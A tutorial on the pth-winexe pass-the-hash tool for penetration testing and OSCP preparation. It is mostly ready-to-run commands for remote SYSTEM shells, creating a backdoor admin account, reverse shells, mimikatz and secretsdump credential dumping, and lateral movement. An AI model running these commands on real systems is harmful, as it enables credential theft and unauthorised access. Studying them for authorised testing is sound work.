# pth-winexe - Pass-the-Hash Windows Command Execution

pth-winexe is a powerful utility that allows executing commands on Windows systems remotely from a Linux machine, using password hashes instead of cleartext passwords. This tool is part of the "passing-the-hash" toolkit and is based on the original winexe tool.

## Installation

pth-winexe is pre-installed on Kali Linux as part of the pth-toolkit:

```bash
# Verify installation
which pth-winexe

# If not installed, install the toolkit
sudo apt update
sudo apt install pth-toolkit
```

## Basic Usage

```bash
# Basic syntax
pth-winexe -U '[domain/]username%LM:NTLM' //target_ip command

# Example - Run cmd.exe as the administrator user
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.10.10 cmd.exe
```

## Key Options

| Option | Description |
|--------|-------------|
| `-U` | Specify the username and password hash in the format 'username%LM:NTLM' |
| `--system` | Run the command with SYSTEM privileges |
| `--uninstall` | Uninstall the winexe service after execution |
| `--no-pass` | Don't ask for a password |
| `--debuglevel=LEVEL` | Set debug level (default: 0) |

## Examples for Penetration Testing

### 1. Get a SYSTEM Shell

```bash
# Execute cmd.exe with SYSTEM privileges
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' --system //10.10.10.10 cmd.exe
```

### 2. Execute a Specific Command

```bash
# Run whoami and exit
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.10.10 'cmd.exe /c whoami'
```

### 3. Add a New Administrator User

```bash
# Create a new admin user
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.10.10 'cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add'
```

### 4. Setup a Reverse Shell

```bash
# Transfer and execute a reverse shell
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.10.10 'cmd.exe /c powershell -e <base64-encoded-reverse-shell>'
```

## LM and NTLM Hash Format

When using pth-winexe, you need to provide the password hash in the correct format:

- **LM hash**: First part of the hash (aad3b435b51404eeaad3b435b51404ee is the empty LM hash in modern Windows)
- **NTLM hash**: Second part, which is the actual NTLM hash of the password

The full format used with pth-winexe is:

```
username%LM:NTLM
```

If you only have the NTLM hash, you can use the empty LM hash (aad3b435b51404eeaad3b435b51404ee).

## Obtaining Hashes for Pass-the-Hash

You can obtain NTLM hashes using various methods:

```bash
# Using mimikatz locally
privilege::debug
sekurlsa::logonpasswords

# Using Impacket's secretsdump remotely
impacket-secretsdump -u Administrator -p 'Password123!' -target-ip 10.10.10.10

# From dumped SAM and SYSTEM files
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

## Advantages for OSCP

- Allows authentication without cracking passwords, saving significant time
- Works with complex passwords that might be difficult or impossible to crack
- Enables lateral movement without needing the cleartext password
- Can be used to target multiple systems where the same password hash is valid
- No need to execute hash-cracking tools like hashcat or John the Ripper

## Limitations

- Requires valid NTLM hashes
- May be blocked by some security controls like Credential Guard
- Creates event logs on the target system
- Requires SMB port (445) to be accessible
- The NTLM authentication protocol must be enabled on the target

## Alternatives

- **Impacket's psexec.py**: `impacket-psexec -hashes LM:NTLM administrator@10.10.10.10`
- **Impacket's wmiexec.py**: `impacket-wmiexec -hashes LM:NTLM administrator@10.10.10.10`
- **Impacket's smbexec.py**: `impacket-smbexec -hashes LM:NTLM administrator@10.10.10.10`
- **CrackMapExec**: `crackmapexec smb 10.10.10.10 -u administrator -H 'NTLM_HASH' -x "whoami"`

## OSCP Exam Tips

For the OSCP exam:

1. **Prepare pth-winexe commands in advance** to save time during the exam
2. **Document the hashes you find** and how you obtained them
3. **Always try Pass-the-Hash before attempting to crack passwords**
4. **Use the `--system` flag** when you need maximum privileges
5. **Be aware of the logs created** on the target system

## Real-World Example

During a penetration test, after obtaining the NTLM hash for the administrator user from a domain controller:

```bash
# Hash extraction result
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::

# Using pth-winexe to get a shell on another machine in the domain
pth-winexe -U 'administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.10.20 cmd.exe

# Once connected, verify success
C:\> whoami
administrator

C:\> hostname
TARGETMACHINE
```

This demonstrates the power of Pass-the-Hash for lateral movement without needing to crack the administrator password. 